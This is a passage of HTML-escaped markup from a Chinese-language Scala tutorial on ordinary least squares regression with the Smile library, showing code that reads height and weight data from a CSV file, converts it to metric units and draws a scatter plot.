&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Double&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;person&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;dataArray&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e &quot;&gt;toDouble *&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;2.54&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061390297424344-28&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;weight&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Double&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;dataArray&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e &quot;&gt;toDouble *&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0.45359237&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061390297424344-29&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061390297424344-30&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//And return the result in a format that can later easily be used to feed to Smile&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061390297424344-31&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//并以一定格式返回结果，使得该结果之后容易输入到Smile中处理&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061390297424344-32&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;weight&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061390297424344-33&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0052 seconds] --&gt;
&lt;p&gt;注意，该数据读取器将数值从&lt;a href=&quot;http://en.wikipedia.org/wiki/Imperial_units&quot;&gt;英制单位&lt;/a&gt;转换为&lt;a href=&quot;http://en.wikipedia.org/wiki/Metric_system&quot;&gt;公制单位&lt;/a&gt;。这对 OLS 的应用没有什么大影响，不过我们还是采用更为&lt;a href=&quot;http://www.realclearscience.com/blog/map%20metric%20jpg&quot;&gt;常用的&lt;/a&gt;公制单位。&lt;/p&gt;
&lt;p&gt;这样操作之后我们得到一个数组 Array[Array[Double]]，该数组包含了数据点和 Array[Double] 值，该值代表男性或女性。这种格式既有利于将数据绘图，也有利于将数据导入机器学习算法中。&lt;/p&gt;
&lt;p&gt;我们首先看看数据是什么样的。为此，用下列代码将数据绘成图。&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b19d061395497261994&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
object LinearRegressionExample extends SimpleSwingApplication {
  def top = new MainFrame {
    title = &quot;Linear Regression Example&quot;
    val basePath = &quot;/Users/.../OLS_Regression_Example_3.csv&quot;

    val testData = getDataFromCSV(new File(basePath))

    val plotData = (testData._1 zip testData._2).map(x =&amp;gt; Array(x._1(1) ,x._2))
    val maleFemaleLabels = testData._1.map( x=&amp;gt; x(0).toInt)
    val plot =  ScatterPlot.plot(   plotData,
                                    maleFemaleLabels,
                                    &#39;@&#39;,
                                    Array(Color.blue, Color.green)
                                 )
    plot.setTitle(&quot;Weight and heights for male and females&quot;)
    plot.setAxisLabel(0,&quot;Heights&quot;)
    plot.setAxisLabel(1,&quot;Weights&quot;)

    peer.setContentPane(plot)
    size = new Dimension(400, 400)
  }&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061395497261994-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061395497261994-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061395497261994-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061395497261994-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061395497261994-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061395497261994-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061395497261994-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061395497261994-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061395497261994-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061395497261994-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061395497261994-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061395497261994-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061395497261994-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061395497261994-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061395497261994-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061395497261994-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061395497261994-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061395497261994-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061395497261994-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061395497261994-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061395497261994-21&quot;&gt;21&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061395497261994-1&quot;&gt;
&lt;span class=&quot;crayon-t&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;LinearRegressionExample&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;extends&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;SimpleSwingApplication&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061395497261994-2&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;def &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;top&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;MainFrame&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061395497261994-3&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;Linear Regression Example&quot;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061395497261994-4&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;basePath&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;/Users/.../OLS_Regression_Example_3.csv&quot;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061395497261994-5&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061395497261994-6&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;testData&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getDataFromCSV&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;basePath&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061395497261994-7&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061395497261994-8&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;plotData&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;testData&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;_1 &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;zip &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;testData&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061395497261994-9&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;maleFemaleLabels&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;testData&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;toInt&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061395497261994-10&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;plot&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;ScatterPlot&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;plot&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;plotData&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061395497261994-11&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                                    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;maleFemaleLabels&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061395497261994-12&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                                    &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&#39;@&#39;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061395497261994-13&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                                    &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Color&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;blue&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Color&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;green&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061395497261994-14&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                                 &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061395497261994-15&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;plot&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;setTitle&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;Weight and heights for male and females&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061395497261994-16&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;plot&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;setAxisLabel&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;Heights&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061395497261994-17&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;plot&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;setAxisLabel&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;Weights&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061395497261994-18&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061395497261994-19&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;peer&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;setContentPane&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;plot&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061395497261994-20&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;Dimension&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;400&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;400&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061395497261994-21&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0035 seconds] --&gt;
&lt;p&gt;如果你执行上面这段代码，就会弹出一个窗口显示以下&lt;strong&gt;右边&lt;/strong&gt;那幅图像。注意当代码运行时，你可以滚动鼠标来放大和缩小图像。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/ed77b49f4ef1296ff31f9276fd0e25f9.jpg&quot; width=&quot;375px&quot;&gt; &lt;img src=&quot;/images/jobbole.com/302f6409a31532e184be31b460089a71.jpg&quot; width=&quot;375px&quot;&gt;&lt;/p&gt;
